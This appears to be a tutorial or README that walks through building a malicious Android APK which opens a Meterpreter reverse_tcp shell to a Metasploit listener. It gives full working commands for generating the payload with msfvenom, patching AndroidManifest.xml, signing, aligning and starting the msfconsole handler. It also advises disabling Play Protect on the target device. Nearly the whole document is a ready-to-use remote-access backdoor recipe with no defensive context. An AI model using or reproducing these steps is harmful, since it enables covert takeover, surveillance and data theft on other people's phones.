Building an app that opens reverse_tcp connection to metasploit server.  
1. Create raw payload apk using msfvenom
2. Update AndroidManifest.xml to make apk compatible with target android
	1. Decompile the apk
	2. Edit AndroidManifest.xml
	3. Recompile the apk
3. Sign the apk
4. Align the apk


## Creating payload apk

1. Creating raw payload apk using `msfvenom`:
```shell
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=<your-ip-address> LPORT=4444 R > raw.apk;
```

2. The above apk created by default targets lower SDK versions than those required by latest android version. To fix this we need to edit the `AndroidManifest.xml` file.
  
Decompiling apk using `apktool`:
```shell
# if not installed: `sudo apt install apktool`
apktool d raw.apk -o decompiled.apk
```
  
The above command creates a folder `decompiled.apk`.  
Inside it we find `AndroidManifest.xml` file, where we need to add:
```shell
<uses-sdk android:minSdkVersion="17" android:targetSdkVersion="23"/>
# if above values doesnt work for you, then check the android logs where error would describe mismatch;
# To check android logs:
#   1. Enable `developer options` on the android
#   2. Connect to the laptop and use `adb` to see the logs:
#         `adb logcat | grep PackageManager`
```
  
Recompile the apk:
```shell
apktool b decompiled.apk -o version_fixed.apk
```

3. Sign the apk. Without signing the apk cannot be installed.
```shell
# Generate keystore if you dont have one alread; this is one time thing
sudo keytool -genkey -V -keystore key.keystore -alias aliname -keyalg RSA -keysize 2048 validity 10000
# this generates keystore `key.store` in your current directory.
# Also remember the keystore password you have set.


# use jarsigner to sign the apk
# To install: `sudo apt-get install openjdk-11-jdk-headless`
sudo jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore version_fixed.apk aliname

# to verify signing
sudo jarsigner -verify -verbose -certs version_fixed.apk
```

4. Align the apk using `zipalign`:
```shell
# If not installed: `sudo apt install zipalign`
zipalign -v 4 version_fixed.apk payload.apk

# verify
zipalign -c 4 payload.apk
# if its proper there would be no output
```

Thus we would have the final payload apk as `payload.apk`.  
Start the listening server (below section) then install the above apk in target android device, ensure to disable play-protect, security, etc as needed.  

## Start listening setup
Listening setup is done in `msfconsole`.  
```shell
# start msfconsole
sudo msfconsole

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST <your-ip-address>  # that was set during payload creation

set LPORT 4444  # this is default value; also set during payload creation

exploit
# this starts listening server
# when user "opens" the apk, a rever_tcp connection is opened here
```

## Post exploitation
Once meterpreter session starts, in its terminal type `help` to get available commands.  
